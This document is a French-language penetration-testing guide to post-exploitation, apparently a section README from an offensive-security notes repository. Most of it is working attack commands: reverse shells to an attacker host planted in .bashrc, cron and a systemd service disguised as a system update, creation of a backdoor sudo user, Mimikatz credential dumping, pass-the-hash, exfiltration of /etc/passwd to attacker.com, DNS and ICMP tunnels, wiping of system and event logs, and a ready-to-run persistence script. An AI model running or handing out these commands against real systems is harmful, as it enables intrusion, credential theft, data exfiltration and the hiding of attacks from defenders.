# 03-Post-Exploitation

## 🔓 Vue d'ensemble

La post-exploitation commence **immédiatement après avoir obtenu un accès initial** au système. C'est la phase où on explore, collecte des informations, maintient l'accès et se déplace latéralement dans le réseau. C'est passer de "j'ai un pied dans la porte" à "je contrôle l'infrastructure".

> **💡 Explication Simple** : Si l'exploitation nous donne une clé de la maison, la post-exploitation c'est explorer toutes les pièces, copier les documents importants, installer des caméras cachées, et trouver les clés des maisons voisines !

## 🎯 Objectifs de la Post-Exploitation

1. **Maintenir l'accès** - Persistence, backdoors, scheduled tasks
2. **Escalader les privilèges** - Passer d'utilisateur normal à admin/root
3. **Voler les credentials** - Mots de passe, hashes, tickets Kerberos
4. **Se déplacer latéralement** - Accéder à d'autres machines du réseau
5. **Exfiltrer les données** - Extraire les informations sensibles
6. **Couvrir ses traces** - Effacer les logs, masquer la présence

## 🗂️ Structure et Techniques

### Persistence/
Maintenir l'accès de façon durable
- **Windows_Persistence.md** - Services, registry, scheduled tasks
- **Linux_Persistence.md** - Cron jobs, systemd, .bashrc
- **Web_Backdoors.md** - Webshells, code injection
- **Network_Persistence.md** - Tunnels persistants, VPN

### Credential_Access/
Vol et extraction de credentials
- **Windows_Credentials.md** - Mimikatz, LSASS, SAM
- **Linux_Credentials.md** - /etc/shadow, SSH keys, history
- **Browser_Credentials.md** - Passwords saved in browsers
- **Network_Credentials.md** - SMB, RDP, service accounts

### Lateral_Movement/
Mouvement dans le réseau
- **Pass_The_Hash.md** - Réutilisation de hashes NTLM
- **Kerberoasting.md** - Attaques contre Kerberos
- **RDP_Hijacking.md** - Session hijacking
- **SSH_Lateral.md** - Propagation via SSH

### Data_Exfiltration/
Extraction de données sensibles
- **File_Exfiltration.md** - HTTPS, DNS, ICMP tunneling
- **Database_Dumping.md** - Extraction de bases de données
- **Network_Exfiltration.md** - Covert channels
- **Cloud_Exfiltration.md** - Cloud storage abuse

### _Tools/
Outils spécialisés de post-exploitation
- **Meterpreter_Advanced.md** - Techniques avancées Meterpreter
- **PowerShell_Empire.md** - Post-exploitation PowerShell
- **Cobalt_Strike.md** - Framework commercial avancé
- **BloodHound.md** - Cartographie Active Directory

## 🎯 Méthodologie Post-Exploitation

### Phase 1 : Stabilisation de l'Accès
```bash
# 1. Améliorer le shell initial
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z puis:
stty raw -echo; fg

# 2. Établir une backdoor
# Reverse shell persistant
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> ~/.bashrc

# 3. Créer un utilisateur de backup (si root)
useradd -m -s /bin/bash hacker
echo "hacker:password123" | chpasswd
usermod -aG sudo hacker
```

### Phase 2 : Reconnaissance du Système
```bash
# 1. Informations système
uname -a                    # Kernel version
cat /etc/os-release        # OS version
whoami && id               # Current user and groups
ps aux                     # Running processes
netstat -tulpn            # Network connections

# 2. Utilisateurs et permissions
cat /etc/passwd           # All users
cat /etc/group            # All groups
sudo -l                   # Sudo permissions
find / -perm -4000 2>/dev/null  # SUID binaries

# 3. Services et démons
systemctl list-unit-files --state=enabled  # Enabled services
crontab -l                # Cron jobs for current user
cat /etc/crontab          # System cron jobs
```

### Phase 3 : Recherche de Credentials
```bash
# 1. Fichiers de configuration
find / -name "*.conf" 2>/dev/null | xargs grep -l "pass\|pwd\|key" 2>/dev/null
find / -name "config.*" 2>/dev/null
cat ~/.bash_history       # Command history
cat ~/.ssh/id_rsa         # SSH private keys

# 2. Bases de données locales
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
mysql -u root -p          # Try MySQL access
cat /var/lib/mysql/mysql/user.MYD  # MySQL users

# 3. Mots de passe en mémoire
strings /proc/[pid]/mem | grep -i pass
```

### Phase 4 : Escalade de Privilèges
```bash
# 1. LinPEAS pour enumeration automatisée
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 2. Tests manuels courants
sudo -l                           # Sudo misconfiguration
find / -perm -4000 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null          # File capabilities
```

## 🖥️ Post-Exploitation Windows avec Meterpreter

### Session Meterpreter - Commandes Essentielles
```bash
# Après obtention d'une session meterpreter
meterpreter > sysinfo              # System information
meterpreter > getuid               # Current user
meterpreter > ps                   # Running processes
meterpreter > netstat              # Network connections

# Migration de processus (important!)
meterpreter > ps                   # Find target process
meterpreter > migrate [PID]        # Migrate to stable process

# Upload/Download de fichiers
meterpreter > upload /local/file.txt C:\\temp\\file.txt
meterpreter > download C:\\file.txt /local/path/
```

### Persistence Windows avec Meterpreter
```bash
# 1. Service persistence
meterpreter > run persistence -S -U -X -i 60 -p 4445 -r attacker_ip

# 2. Registry persistence
meterpreter > run persistence -H -U -X -i 60 -p 4445 -r attacker_ip

# 3. Metsvc service
meterpreter > run metsvc -A        # Install Meterpreter service

# 4. Golden ticket (si Domain Admin)
meterpreter > load kiwi
meterpreter > golden_ticket_create -d domain.com -k [krbtgt_hash] -s [SID] -u administrator -t /tmp/golden.ticket
```

### Credential Harvesting Windows
```bash
# 1. Mimikatz via Meterpreter
meterpreter > load kiwi
meterpreter > creds_all            # Dump all credentials
meterpreter > creds_wdigest        # WDigest passwords
meterpreter > creds_msv            # MSV passwords
meterpreter > creds_livessp        # LiveSSP passwords

# 2. Hash dumping
meterpreter > hashdump             # Local SAM hashes
meterpreter > lsa_dump_sam         # SAM via LSA
meterpreter > lsa_dump_secrets     # LSA secrets

# 3. Process memory scraping
meterpreter > ps                   # Find target processes
meterpreter > migrate [PID]        # Migrate to LSASS
meterpreter > load kiwi
meterpreter > creds_all
```

## 🐧 Post-Exploitation Linux Avancée

### Persistence Linux
```bash
# 1. Cron job persistence
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /var/spool/cron/crontabs/root

# 2. Service systemd
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# 3. SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa [your_public_key]" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Credential Extraction Linux
```bash
# 1. Password hashes
cat /etc/shadow                    # Requires root
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt

# 2. SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
cat ~/.ssh/id_rsa

# 3. Browser credentials
find ~ -name "*.db" | grep -i chrome
sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins"

# 4. Configuration files
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" ~/.config/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password\|pass\|pwd" {} \; 2>/dev/null
```

## 🌐 Lateral Movement

### Pass-the-Hash avec Metasploit
```bash
# 1. Obtenir les hashes avec Mimikatz
meterpreter > load kiwi
meterpreter > lsa_dump_sam

# 2. Utiliser les hashes pour se connecter à d'autres machines
msfconsole
use exploit/windows/smb/psexec
set RHOSTS target2.com
set SMBUser Administrator
set SMBPass [hash_value]  # Format LM:NTLM
run

# 3. Pass-the-hash avec pth-winexe
pth-winexe -U Administrator%[LM_hash]:[NTLM_hash] //target2.com cmd.exe
```

### SSH Key Propagation
```bash
# 1. Copier la clé privée trouvée
scp user@compromised_host:~/.ssh/id_rsa ./stolen_key
chmod 600 stolen_key

# 2. Utiliser la clé pour accéder à d'autres systèmes
ssh -i stolen_key user@target2.com

# 3. Scanner le réseau pour d'autres cibles SSH
nmap -p 22 internal_network/24
for ip in $(nmap -p 22 --open internal_network/24 | grep "Nmap scan report" | awk '{print $5}'); do
    ssh -i stolen_key -o ConnectTimeout=5 user@$ip "hostname" 2>/dev/null
done
```

### RDP Session Hijacking
```bash
# 1. Lister les sessions RDP actives
meterpreter > run post/windows/gather/enum_logged_on_users

# 2. Utiliser tscon pour hijacker une session
meterpreter > shell
C:\> query session
C:\> tscon [session_id] /dest:console

# 3. Ou utiliser le module Metasploit
meterpreter > run post/windows/manage/enable_rdp
meterpreter > run post/windows/manage/rdp_hijack
```

## 📊 Data Exfiltration

### Techniques de Base
```bash
# 1. HTTP POST exfiltration
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload.php

# 2. DNS tunneling avec dnscat2
# Sur l'attaquant:
dnscat2-server attacker.com
# Sur la victime:
./dnscat2 attacker.com

# 3. ICMP tunneling
# Sur l'attaquant:
icmpsh_m.py attacker_ip victim_ip
# Sur la victime:
icmpsh.exe -t attacker_ip

# 4. Base64 encoding pour bypass
cat sensitive_file.txt | base64 | curl -X POST -d @- http://attacker.com/data
```

### Exfiltration via Cloud Storage
```bash
# 1. Upload vers cloud storage
# S3 (si credentials AWS trouvés)
aws s3 cp sensitive_data.zip s3://bucket/

# 2. Google Drive via API
curl -X POST \
  'https://www.googleapis.com/upload/drive/v3/files?uploadType=media' \
  -H 'Authorization: Bearer [access_token]' \
  -H 'Content-Type: application/zip' \
  --data-binary '@sensitive_data.zip'

# 3. Dropbox
curl -X POST https://content.dropboxapi.com/2/files/upload \
  --header "Authorization: Bearer [access_token]" \
  --header "Content-Type: application/octet-stream" \
  --data-binary @sensitive_data.zip
```

## 🕵️ Covering Tracks

### Log Cleaning Linux
```bash
# 1. Nettoyer les logs système
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages

# 2. History cleanup
history -c                        # Clear current session
echo "" > ~/.bash_history        # Clear history file
unset HISTFILE                   # Disable history for session

# 3. Nettoyer les logs d'accès web
echo "" > /var/log/apache2/access.log
echo "" > /var/log/nginx/access.log

# 4. Nettoyer sélectivement
sed -i '/attacker_ip/d' /var/log/auth.log
grep -v "specific_command" ~/.bash_history > temp && mv temp ~/.bash_history
```

### Log Cleaning Windows
```bash
# 1. Via Meterpreter
meterpreter > clearev              # Clear all event logs

# 2. Via PowerShell
meterpreter > shell
C:\> powershell "Clear-EventLog -LogName Application,System,Security"

# 3. Nettoyer des logs spécifiques
C:\> wevtutil cl Application
C:\> wevtutil cl System
C:\> wevtutil cl Security

# 4. Désactiver le logging temporairement
C:\> auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
```

## 🛠️ Outils Avancés de Post-Exploitation

### PowerShell Empire
```bash
# 1. Génération d'un agent PowerShell
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://attacker_ip:8080
(Empire: listeners/http) > execute

(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > generate

# 2. Commandes post-exploitation
(Empire: [agent_name]) > usemodule credentials/mimikatz/logonpasswords
(Empire: [agent_name]) > usemodule persistence/userland/registry
(Empire: [agent_name]) > usemodule lateral_movement/invoke_psexec
```

### BloodHound pour Active Directory
```bash
# 1. Collecte des données AD
# Sur la machine compromise:
powershell -ep bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.com

# 2. Analyse avec BloodHound
neo4j start
./BloodHound
# Import des fichiers .json générés

# 3. Requêtes utiles
# - Find all Domain Admins
# - Shortest Paths to Domain Admins from Owned Principals
# - Find Kerberoastable Users
```

## 📋 Checklist Post-Exploitation

### ✅ Immédiatement après compromise :
1. **Stabiliser le shell** - TTY upgrade, session stable
2. **Reconnaissance rapide** - OS, user, network position
3. **Backup access** - Créer une persistence immédiate
4. **Migration** - Process stable (Meterpreter)
5. **Documentation** - Screenshots, commandes exécutées

### ✅ Persistence et Escalation :
1. **Multiple backdoors** - Cron, service, registry, SSH keys
2. **Privilege escalation** - LinPEAS, WinPEAS, manual enum
3. **Credential harvesting** - Mimikatz, /etc/shadow, browser
4. **Token impersonation** - Si privilèges suffisants
5. **Golden/Silver tickets** - Si environnement AD

### ✅ Lateral Movement :
1. **Network enumeration** - Scan interne, services
2. **Credential reuse** - Pass-the-hash, SSH keys
3. **Jump servers** - Identifier les pivots
4. **Service accounts** - Kerberoasting, AS-REP roasting
5. **Trust relationships** - Domain/forest trusts

### ✅ Data Exfiltration :
1. **Data classification** - Identifier les données sensibles
2. **Staging area** - Comprimer et préparer
3. **Covert channels** - DNS, ICMP, HTTPS
4. **Size limitations** - Fragmenter si nécessaire
5. **Integrity checks** - Hash des données exfiltrées

## 🎓 Scripts d'Automatisation

### Script de Persistence Linux
```bash
#!/bin/bash
# Linux Persistence Script

# Cron job persistence
echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4443 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... your_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bashrc persistence
echo "nohup bash -i >& /dev/tcp/attacker_ip/4442 0>&1 &" >> ~/.bashrc

# Service persistence (if root)
if [ "$EUID" -eq 0 ]; then
    cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4441 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable update.service
fi

echo "Persistence mechanisms installed"
```

### Script de Reconnaissance Automatisée
```bash
#!/bin/bash
# Post-Exploitation Reconnaissance

# System information
echo "=== SYSTEM INFO ===" > recon_results.txt
uname -a >> recon_results.txt
cat /etc/os-release >> recon_results.txt
whoami >> recon_results.txt
id >> recon_results.txt

# Network information
echo -e "\n=== NETWORK INFO ===" >> recon_results.txt
ip addr >> recon_results.txt
netstat -tulpn >> recon_results.txt
ss -tulpn >> recon_results.txt

# Users and permissions
echo -e "\n=== USERS INFO ===" >> recon_results.txt
cat /etc/passwd >> recon_results.txt
sudo -l >> recon_results.txt 2>&1

# Look for credentials
echo -e "\n=== POTENTIAL CREDENTIALS ===" >> recon_results.txt
find / -name "*.conf" 2>/dev/null | head -20 >> recon_results.txt
grep -r "password\|pass\|pwd" /etc/ 2>/dev/null | head -10 >> recon_results.txt

echo "Reconnaissance completed. Check recon_results.txt"
```

## ⚠️ Considérations Importantes

### 🚨 OPSEC (Operational Security)
- **Logs monitoring** - Certains logs sont surveillés en temps réel
- **AV/EDR detection** - Outils modernes détectent Mimikatz, Empire
- **Network monitoring** - Trafic inhabituel peut alerter
- **Timeline awareness** - Éviter les actions pendant les heures de bureau

### 🛡️ Limitations et Détection
- **Privilege escalation** peut déclencher des alertes
- **Lateral movement** laisse des traces sur tous les systèmes
- **Data exfiltration** massive est facilement détectable
- **Persistence** peut être découverte lors d'audits de sécurité

---
*Cette section couvre la post-exploitation complète. Les techniques doivent être adaptées selon l'environnement et les objectifs du test d'intrusion.* 